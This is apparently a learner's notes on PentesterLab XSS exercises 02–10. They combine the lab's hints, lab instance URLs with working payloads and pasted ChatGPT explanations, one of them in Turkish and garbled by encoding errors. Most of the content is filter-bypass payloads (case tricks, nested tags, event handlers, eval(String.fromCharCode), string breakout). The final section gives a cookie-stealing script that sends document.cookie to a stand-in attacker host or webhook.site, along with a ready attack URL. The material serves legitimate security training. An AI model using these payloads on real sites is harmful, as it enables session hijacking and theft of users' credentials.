XSS 02

In the second example, a bit of filtering is involved. The web developer added some regular expressions, to prevent the simple XSS payload from working.

If you play around, you can see that <script> and </script> are filtered. One of the most basic ways to bypass these types of filters is to play with the case: if you try <sCript> and </sCRIpt> for example, you should be able to get the alert box.


XSS 03

You notified the developer about your bypass. He has added more filtering, which now seems to prevent your previous payload. However, he is making a terrible mistake in his code (which was also present in the previous code)...

If you keep playing around, you will realise that if you use Pentest<script>erLab for payload, you can see PentesterLab in the page. You can probably use that to get <script> in the page, and your alert box to pop up.

<scr<script>ipt>alert(1)</scr</script><ipt>


https://ptl-a9b65de94e2f-f3bf6622f3fb.libcurl.me/index.php?name=%3Cscr%3Cscript%3Eipt%3Ealert(%27527fee93-0b03-4317-affb-2ce32cde791a%27)%3C/scr%3C/script%3Eipt%3E



XSS 04

In this example, the developer decided to completely block the word `script`: if the request matches `script`, the execution stops.

Fortunately (or unfortunately depending on what side you are on), there are a lot of ways to get JavaScript to be run (non-exhaustive list):

with the <a tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick ...

with the &lt;a tag directly in the URL: <a href='javascript:alert(1)'... (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use script in this example).

with the <img tag directly with the event onerror: <img src='zzzz' onerror='alert(1)' />.

with the <div tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick...

...
You can use any of these techniques to get the alert box to pop-up.


XSS 04 ChatGPT

In the context of web security, specifically Cross-Site Scripting (XSS) vulnerabilities, blocking a specific keyword like script is often insufficient because there are many alternative ways to execute JavaScript code in an HTML document. Here are some common methods to bypass such restrictions and execute JavaScript code without using the <script> tag.


---Alternative Methods to Execute JavaScript---

1. Using <a> Tag with Event Handlers
    onmouseover: Triggers JavaScript when the mouse pointer moves over the element.
    onmouseout: Triggers JavaScript when the mouse pointer moves out of the element.
    onclick: Triggers JavaScript when the element is clicked.
Example:
<a href="#" onmouseover="alert('Mouseover Event Triggered')">Hover over me</a>

2. Using JavaScript URLs in <a> Tags
    Although the example below won't work if the script keyword is blocked, here is how it generally works:

    <a href="javascript:alert('JavaScript URL')">Click me</a>



3. Using <img> Tag with onerror Event
   The onerror event triggers JavaScript when an error occurs while loading an image.
   Example:

   <img src="nonexistent.jpg" onerror="alert('Image Load Error')">



4. Using <div> Tag with Event Handlers
   onmouseover: Triggers JavaScript when the mouse pointer moves over the element.
   onmouseout: Triggers JavaScript when the mouse pointer moves out of the element.
   onclick: Triggers JavaScript when the element is clicked.

   Example:

   <div onmouseover="alert('Mouseover Event Triggered')" style="width: 100px; height: 100px; background-color: yellow;">Hover over me</div>


    ---Other Methods:---

5. Using <input> Tag with onfocus Event

   The onfocus event triggers JavaScript when the input field gains focus.

   Example:
   <input type="text" onfocus="alert('Input Focused')">


6. Using <body> Tag with onload Event

    The onload event triggers JavaScript when the page or an image is fully loaded.
    Example:
    
    <body onload="alert('Page Loaded')">


---Summary---

Even if the <script> tag is blocked, there are numerous other HTML elements and attributes that can be exploited to run JavaScript. To effectively mitigate XSS vulnerabilities, it's crucial to:

1. Sanitize Inputs: Ensure all user inputs are sanitized and validated.
2. Encode Outputs: Properly encode output data to prevent injection attacks.
3. Use Security Libraries: Implement security libraries and frameworks designed to prevent XSS.
4. Content Security Policy (CSP): Use CSP to restrict the sources from which scripts can be executed.

---Example Scenarios---



Scenario 1: Using <img> Tag
<img src="nonexistent.jpg" onerror="alert('XSS via Image')">

Scenario 2: Using <div> Tag
    <div onmouseover="alert('XSS via Div')" style="width: 100px; height: 100px; background-color: yellow;">Hover over me</div>


By understanding and leveraging these alternative methods, an attacker can execute JavaScript even when certain keywords like script are blocked. It is essential to adopt a comprehensive approach to input validation and output encoding to defend against such attacks.




XSS 05

In this example, the <script> tag is accepted and gets echoed back. But as soon as you try to inject a call to alert, the PHP script stops its execution. The problem seems to come from a filter on the word alert.

Using JavaScript's eval and String.fromCharCode(), you should be able to get an alert box without using the word alert directly. String.fromCharCode() will decode an integer (decimal value) to the corresponding character.

You can write a small tool to transform your payload to this format using your favorite scripting language.

Using this trick and the ascii table, you can easily generate the string: alert(1) and call eval on it.


---XSS 05 ChatGPT---

Bypassing the alert Filter with eval and String.fromCharCode

When a web application filters specific keywords like alert, it can still be possible to execute JavaScript by using alternative methods to represent the same functionality. In this case, JavaScript's eval function and String.fromCharCode() method can be used to bypass the filter.

String.fromCharCode() converts Unicode values (decimal values) to characters. By using this function, you can construct the string "alert(1)" without directly writing it.

Step-by-Step Approach
Convert the Payload to Unicode Values:

The payload alert(1) can be represented as Unicode values:
a -> 97
l -> 108
e -> 101
r -> 114
t -> 116
( -> 40
1 -> 49
) -> 41
Construct the Payload using String.fromCharCode():

 You can create the string "alert(1)" using String.fromCharCode():
  eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))

Test the Payload:

 Use this constructed payload in your script to see if it successfully bypasses the filter and executes the alert(1).


--Example Payload--
Here's how you can write this in an HTML context:
    <script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41));</script>

Automating the Conversion
You can write a small script in your favorite programming language to automate the conversion of any string into its corresponding String.fromCharCode() format.


Summary
By converting the string alert(1) into its Unicode representation using String.fromCharCode(), you can bypass filters that block specific keywords like alert. This method leverages JavaScript's flexibility to execute arbitrary code in a more obfuscated manner. Always remember to test such payloads in a controlled and ethical environment, such as a bug bounty program or a security research lab, to avoid legal and ethical issues.


To achieve alert("527fee93-0b03-4317-affb-2ce32cde791a") using eval(String.fromCharCode()) with decimal encoding in a single line, you can follow these steps:

Convert the string alert("527fee93-0b03-4317-affb-2ce32cde791a") to its decimal character codes.
Construct a single line of JavaScript code using String.fromCharCode to rebuild and execute the string.
Hereâ€™s the complete single-line code:

eval(String.fromCharCode(97,108,101,114,116,40,34,53,50,55,102,101,101,57,51,45,48,98,48,51,45,52,51,49,55,45,97,102,102,98,45,50,99,101,51,50,99,100,101,55,57,49,97,34,41))

Explanation
 1. Convert each character to its decimal ASCII code:
a -> 97
l -> 108
e -> 101
r -> 114
t -> 116
( -> 40
" -> 34
5 -> 53
2 -> 50
7 -> 55
f -> 102
e -> 101
e -> 101
9 -> 57
3 -> 51
- -> 45
0 -> 48
b -> 98
0 -> 48
3 -> 51
- -> 45
4 -> 52
3 -> 51
1 -> 49
7 -> 55
- -> 45
a -> 97
f -> 102
f -> 102
b -> 98
- -> 45
2 -> 50
c -> 99
e -> 101
3 -> 51
2 -> 50
c -> 99
d -> 100
e -> 101
7 -> 55
9 -> 57
1 -> 49
a -> 97
" -> 34
) -> 41
2. Construct the String.fromCharCode calls:
   Join these codes into a single line as parameters to String.fromCharCode.

Full Single-Line Code
 Here is the full single-line code that achieves the desired result:
  eval(String.fromCharCode(97,108,101,114,116,40,34,53,50,55,102,101,101,57,51,45,48,98,48,51,45,52,51,49,55,45,97,102,102,98,45,50,99,101,51,50,99,100,101,55,57,49,97,34,41));

When this code is executed, it will display an alert with the message "527fee93-0b03-4317-affb-2ce32cde791a".





XSS 06

Here, the source code of the HTML page is a bit different. If you read it, you will see that the value you are sending is echoed back inside JavaScript code. To get your alert box, you will not need to inject a script tag, you will just need to correctly complete the pre-existing JavaScript code and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using //) or by adding some dummy code (var $dummy = ") to close it correctly.

/index.php?name=";alert(1);var a="

becomes in the source page
<script>
              var $a= "";alert(1);var a="";
            </script>
                </p>




XSS 07

This example is similar to the one before. This time, you won't be able to use special characters, since they will be HTML-encoded. As you will see, you don't really need any of these characters.

This issue is common in PHP web applications, because the well-known function used to HTML-encode characters (htmlentities) does not encode single quotes ('), unless you told it to do so, using the ENT_QUOTES flag.



XSS 07 ChatGPT

Bir PHP web uygulamasÄ±nda kullanÄ±cÄ± girdisi, JavaScript kodu iÃ§inde yansÄ±tÄ±ldÄ±ÄŸÄ±nda ve Ã¶zel karakterler HTML-encode yapÄ±ldÄ±ÄŸÄ±nda, bu durumu Cross-Site Scripting (XSS) saldÄ±rÄ±larÄ± iÃ§in kullanabilmek biraz daha karmaÅŸÄ±k hale gelebilir. Ancak, PHP'de kullanÄ±lan htmlentities fonksiyonu Ã¶zel karakterleri encode ederken tek tÄ±rnaklarÄ± (') varsayÄ±lan olarak encode etmez. Bu durum, XSS saldÄ±rÄ±larÄ± iÃ§in bir aÃ§Ä±klÄ±k yaratabilir.

Ä°ÅŸte bu tÃ¼r bir durumda izlenebilecek adÄ±mlar:

AdÄ±m 1: Durumu Anlamak
Ã–ncelikle, kullanÄ±cÄ± girdisinin JavaScript kodunda nasÄ±l yansÄ±tÄ±ldÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir. Ã–rneÄŸin, kullanÄ±cÄ± girdisi bir deÄŸiÅŸken olarak mÄ± atanÄ±yor, bir fonksiyon Ã§aÄŸrÄ±sÄ± iÃ§inde mi kullanÄ±lÄ±yor, yoksa bir HTML Ã¶ÄŸesi Ã¶zelliÄŸi olarak mÄ± yansÄ±tÄ±lÄ±yor?

AdÄ±m 2: Payload'u YapÄ±landÄ±rmak
Ã–zel karakterler encode edildiÄŸinden, fakat tek tÄ±rnak (') encode edilmediÄŸinden, bu tÄ±rnaÄŸÄ± kullanarak mevcut JavaScript kodunu kapatabilir ve kendi kodunuzu enjekte edebilirsiniz. Burada String.fromCharCode() fonksiyonunu kullanarak, doÄŸrudan Ã¶zel karakterler kullanmadan karakterleri temsil edebilirsiniz.

Ã–rnek Senaryo
Farz edelim ki, HTML kodu ÅŸu ÅŸekilde:

<script>
    var userInput = 'kullanÄ±cÄ±dan gelen deÄŸer'; // KullanÄ±cÄ± girdisi burada yansÄ±tÄ±lÄ±yor
    // DiÄŸer JavaScript kodlarÄ±
</script>

Bu durumda, kullanÄ±cÄ± girdiniz userInput deÄŸiÅŸkeni iÃ§ine tek tÄ±rnaklar arasÄ±nda yansÄ±tÄ±lÄ±yor.

Bu durumda, kullanÄ±cÄ± girdiniz userInput deÄŸiÅŸkeni iÃ§ine tek tÄ±rnaklar arasÄ±nda yansÄ±tÄ±lÄ±yor.

AdÄ±m 3: Ã–rnek Payload
AÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyerek payload oluÅŸturabiliriz:

Mevcut tek tÄ±rnaklÄ± dizeyi kapatmak iÃ§in bir tek tÄ±rnak kullanÄ±n.
String.fromCharCode() ile alert('XSS') komutunu oluÅŸturun.
Yine tek tÄ±rnak ile dizeyi kapatÄ±n.
Ã–rnek Payload:

alert('XSS') fonksiyonunu String.fromCharCode() kullanarak ÅŸu ÅŸekilde yazabiliriz:

' + String.fromCharCode(97, 108, 101, 114, 116) + String.fromCharCode(40, 39, 88, 83, 83, 39, 41) + '

AÃ§Ä±klama:

97, 108, 101, 114, 116: alert kelimesinin ASCII kodlarÄ±.
40, 39, 88, 83, 83, 39, 41: ('XSS') ifadesinin ASCII kodlarÄ±.

Nihai Enjeksiyon

KullanÄ±cÄ± girdi alanÄ±na ÅŸu deÄŸeri girdiÄŸinizde:

' + String.fromCharCode(97, 108, 101, 114, 116) + String.fromCharCode(40, 39, 88, 83, 83, 39, 41) + '

Bu kod, HTML iÃ§inde ÅŸu ÅŸekilde gÃ¶rÃ¼necektir:

<script>
    var userInput = '' + String.fromCharCode(97, 108, 101, 114, 116) + String.fromCharCode(40, 39, 88, 83, 83, 39, 41) + ''; // KullanÄ±cÄ± girdisi burada yansÄ±tÄ±lÄ±yor
    // DiÄŸer JavaScript kodlarÄ±
</script>

Ã‡Ä±ktÄ± AÃ§Ä±klamasÄ±:

'' + String.fromCharCode(...) + '' mevcut diziyi kapatÄ±r ve kendi kodunuzu enjekte eder, ardÄ±ndan yeni bir dizeyi aÃ§ar, bÃ¶ylece JavaScript sÃ¶zdizimi bozulmaz ve kalan kod hataya sebep olmaz.

SonuÃ§

Bu teknikle, tek tÄ±rnak ve String.fromCharCode() kullanarak HTML encode edilmiÅŸ karakterlerin engellerini aÅŸarak JavaScript kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz. Bu tÃ¼r teknikleri yalnÄ±zca kontrollÃ¼ ortamlarda ve etik sÄ±nÄ±rlar iÃ§inde denemeniz gerektiÄŸini unutmayÄ±n.


Instance Page Source
<!-- PentesterLab --> 
<html>
    <head>
        <title>[PentesterLab] Essential XSS 07</title>
        <link rel="stylesheet" media="screen" href="/css/bootstrap.css" />
        <link rel="stylesheet" media="screen" href="/css/pentesterlab.css" />
        <script src="https://pentesterlab.com/tracking/xss_07.js"></script>
    </head>
    <body>
      <div class="container-narrow">
        <div class="header">
          <div class="navbar navbar-fixed-top">
            <div class="nav-collapse collapse">
              <ul class="nav navbar-nav">
                  <li><a href="https://pentesterlab.com">PentesterLab.com</a></li>
              </ul>
            </div>
          </div>
        </div>
      </div>
      <div class="container">
        <div class="body-content">


<div class="row">
  <div class="col-lg-12">
    <h1>XSS 07</h1>
      <p>Welcome!
                    <script>
              var $a= 'hacker';
            </script>
                </p>
        
   
      <p>The objective of this exercise is to find the XSS in this page. First, you can start by personalising the page with your name by using <a href="/index.php?name=hacker">this link</a> and play with the URL.</p>
  </div>
</div>



      <footer>
        <p>&copy; PentesterLab</p>
      </footer>

    </div> <!-- /container -->


  </body>
</html>

ChatGPT Answer

In this scenario, you are tasked with finding and exploiting an XSS (Cross-Site Scripting) vulnerability in the given HTML page. The key point here is that the user input (in this case, the name parameter in the URL) is being reflected back into the page, specifically inside a JavaScript context.

Analysis

The critical part of the HTML code is:

<p>Welcome!
  <script>
    var $a= 'hacker';
  </script>
</p>

The value of the name parameter (hacker in this case) is directly embedded in the JavaScript variable $a. This suggests that the value could potentially be exploited if not properly sanitized.

Objective

The goal is to inject JavaScript code via the name parameter in the URL to demonstrate XSS. Since the input is being placed within single quotes in the script, special characters might be encoded, but single quotes may not be, allowing for injection.

Steps to Exploit

1. Insert the Payload: The payload should aim to close the existing string and introduce an alert or any JavaScript code.

2. Neutralize Following Code: Use comments or dummy code to ensure the injected code doesn't break the page's JavaScript.

Payload Construction

To exploit this, consider the following payload:

1. Close the Current String:
Insert ' to close the existing JavaScript string.

2. Inject Malicious Code:
For instance, alert('XSS').

3. Neutralize the Rest of the Code:
Use // to comment out the rest of the script.

Payload Example:

';alert(1);//'

URL to Use
Using the above payload in the URL would look like this:

https://example.com/index.php?name=';alert(1);//'

When processed, the HTML would render as:

<p>Welcome!
  <script>
    var $a = '';alert(1);//';
  </script>
</p>

This script effectively:

Closes the initial string with ''.
Injects an alert(1);.
Comments out the rest of the script with //.
Notes
Always ensure to test in a controlled environment.
Be aware of legal and ethical considerations when testing real-world applications.
Use responsible disclosure practices if vulnerabilities are found in live systems.
This example highlights the importance of properly sanitizing and encoding user inputs in web applications to prevent XSS and other injection attacks.



XSS 08

Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted PHP_SELF which is the path provided by the user. It's possible to manipulate the path of the application in order to:

 call the current page (however you will get an HTTP 404 page);
 get a XSS payload in the page.

This can be done because the current configuration of the server will call /index.php when any URL matching /index.php/... is accessed. You can simply get your payload inside the page by accessing /index.php/[XSS_PAYLOAD]. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box.

Trusting the path provided by users is a common mistake, and it can often be used to trigger XSS, as well as other issues. This is pretty common in pages with forms, and in error pages (404 and 500 pages).

Page Source
<form action="/index.php/hacker"><script>alert(1)</script><"" method="POST">

https://ptl-8cc9910cad42-48973915543a.libcurl.me/index.php/hacker"><script>alert(1)</script><"




XSS 09

This example is a DOM-based XSS. This page could actually be completely static and still be vulnerable.

In this example, you will need to read the code of the page to understand what is happening. When the page is rendered, the JavaScript code uses the current URL to retrieve the anchor portion of the URL (#...) and dynamically (on the client side) write it inside the page. This can be used to trigger a XSS vulnerability, if you use the payload as part of the URL.

Since most browsers now encode the fragment, this vulnerable application decodes the fragment using the function decodeURIComponent(...). With old browsers, the exploitation works even if decodeURIComponent(...) is not present.

https://ptl-4da882835c9b-1891889d0051.libcurl.me/index.php#<script>alert(1)</script>




WHAT IS DOM-based XSS?

DOM-based XSS (Document Object Model-based Cross-Site Scripting) is a type of Cross-Site Scripting (XSS) attack that occurs on the client side rather than the server side. In DOM-based XSS, the vulnerability arises when the client-side JavaScript code processes user input, modifies the DOM (Document Object Model) of the page, and potentially executes malicious code as a result.

Unlike other XSS types, such as Reflected or Stored XSS, where the server-side code is responsible for injecting the malicious script into the page, DOM-based XSS vulnerabilities are purely a result of the way the client-side JavaScript handles data.

How DOM-based XSS Works

1. User Input Handling:
  The client-side JavaScript retrieves data from the user or another source, such as the URL, cookies, or local storage.

2. DOM Manipulation:
 The JavaScript modifies the structure or content of the page's DOM based on this data, without proper sanitization or validation.

3. Execution of Malicious Code:
 If an attacker can control the data that influences the DOM manipulation, they can inject and execute arbitrary JavaScript code.


Example of DOM-based XSS

Consider a simple example where a web application uses JavaScript to display a message on the page based on a message parameter in the URL:

<!DOCTYPE html>
<html>
<head>
    <title>DOM-based XSS Example</title>
</head>
<body>
    <p id="output"></p>
    <script>
        var message = new URLSearchParams(window.location.search).get('message');
        document.getElementById('output').innerHTML = message;
    </script>
</body>
</html>


In this example, the script extracts the message parameter from the URL and sets it as the inner HTML of a paragraph element. If an attacker sets the URL to:

http://example.com/page.html?message=<script>alert('XSS')</script>

The message variable would contain <script>alert('XSS')</script>, and the JavaScript would insert this directly into the DOM, resulting in the execution of the alert('XSS') script.


Preventing DOM-based XSS
To prevent DOM-based XSS, developers should:

1. Avoid Using innerHTML:
 Prefer methods like textContent or innerText when inserting user data into the DOM, as these do not interpret the content as HTML.

2. Sanitize and Validate Input:
 Use libraries or custom functions to sanitize and validate all user input before using it in the DOM.

3. Use Safe JavaScript APIs:
 When possible, use safe DOM methods and properties that do not involve parsing HTML or JavaScript.

4. Content Security Policy (CSP):
 Implement a CSP to restrict the sources of executable scripts and reduce the risk of XSS attacks.

Example of Safe Code

<!DOCTYPE html>
<html>
<head>
    <title>DOM-based XSS Example</title>
</head>
<body>
    <p id="output"></p>
    <script>
        var message = new URLSearchParams(window.location.search).get('message');
        document.getElementById('output').textContent = message;
    </script>
</body>
</html>

In this safe version, textContent is used instead of innerHTML, preventing any HTML or script execution from the message content.

DOM-based XSS vulnerabilities highlight the importance of secure coding practices on the client side and the need for comprehensive security measures throughout the web application stack.



XSS 10

This exercise is identical to the first one. But this time, you're going to have to retrieve the victim's cookie. To do so, you can:
 Use your own server
 Use webhook.site

To get the cookie, you will use JavaScript. Your JavaScript code will retrieve the victim's cookies with document.cookie. Then you will add the value to a <img tag to send it to your website (or webhook.site).

Your payload should look like:

<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>

Once the browser renders the JavaScript the <img tag should look like:

<img src="[URL]?c=[COOKIE]"/>

And it will send the cookies to your website.

Make sure you don't forget to encode the + in the URL (%2b).


XSS 10 ChatGPT

In this exercise, the goal is to retrieve the victim's cookies by exploiting a Cross-Site Scripting (XSS) vulnerability. The attacker can use the JavaScript document.cookie property to access the cookies stored by the victim's browser and then send this data to an external server they control.


Steps to Retrieve Cookies Using XSS

1. Steps to Retrieve Cookies Using XSS
 You can use your own server or a service like webhook.site to capture the data sent by the victim's browser.

2. Craft the XSS Payload:
 The payload will involve JavaScript that captures the cookie data and sends it to the attacker's server using an image tag (<img>).

3. Deploy the Payload:
 The payload can be injected into the vulnerable application, which then executes the JavaScript and sends the cookie data to the attacker's server.


Example Payload
Here's how the payload might look in JavaScript:

<script>
document.write('<img src="https://your-server.com/collect?c=' + encodeURIComponent(document.cookie) + '" />');
</script>

In this payload:
 document.cookie: This retrieves all cookies for the current domain.
 
 encodeURIComponent: This function ensures that the cookie data is safely encoded for use in a URL.
 
 document.write: This function writes the HTML for an image tag to the document, which triggers a request to the attacker's server.


URL Example
If the attacker's server is https://your-server.com/collect, the resulting URL might look like this:

https://your-server.com/collect?c=[COOKIE_DATA]

Where [COOKIE_DATA] will be the URL-encoded cookies from the victim's browser.


Using webhook.site
If using [webhook.site], you can generate a unique URL for testing:

 1.  Go to webhook.site and generate a unique URL.
 2.  Replace https://your-server.com/collect with your unique Webhook URL in the payload.

Example:

<script>
document.write('<img src="https://webhook.site/your-unique-id?c=' + encodeURIComponent(document.cookie) + '" />');
</script>


Important Considerations

 Ethical and Legal Concerns: Testing for vulnerabilities like XSS must always be done ethically and legally. Make sure you have explicit permission to test the website and avoid any unauthorized data access.
 
 Encoding the + Character: The + character in URLs is used to denote spaces, so if your cookie contains this character, ensure you encode it properly. However, using encodeURIComponent() handles this and other special characters appropriately.


Example in Context
If the vulnerable application accepts user input that gets reflected in the page, such as through a query parameter, the XSS payload can be injected directly. For instance:

https://vulnerable-site.com/index.php?name=<script>document.write('<img src="https://webhook.site/your-unique-id?c=' + encodeURIComponent(document.cookie) + '" />');</script>

When a victim visits this URL, their browser will execute the JavaScript, capture their cookies, and send them to the specified server.

This demonstrates a practical example of how XSS can be exploited to steal sensitive information like cookies, which may include session tokens and other authentication data.









